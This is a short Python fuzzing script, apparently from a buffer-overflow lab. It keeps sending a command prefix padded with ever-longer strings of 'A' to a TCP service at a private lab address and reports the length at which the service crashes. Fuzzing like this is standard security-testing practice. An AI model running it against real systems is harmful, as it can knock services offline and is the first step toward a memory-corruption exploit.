import socket
from ipaddress import ip_address
from time import sleep
import sys
ip="10.10.208.180"
port=9999
numberOfCharacters = 100
stringToSend = "emir /.:/" + "A" * numberOfCharacters

while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect((ip,port))
        bytes = stringToSend.encode(encoding="latin1")
        mySocket.send(bytes)
        mySocket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)
    except KeyboardInterrupt:
        print("Crashed at: " + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("Crashed at: "+ str(len(stringToSend)))
        print(e)
        sys.exit()
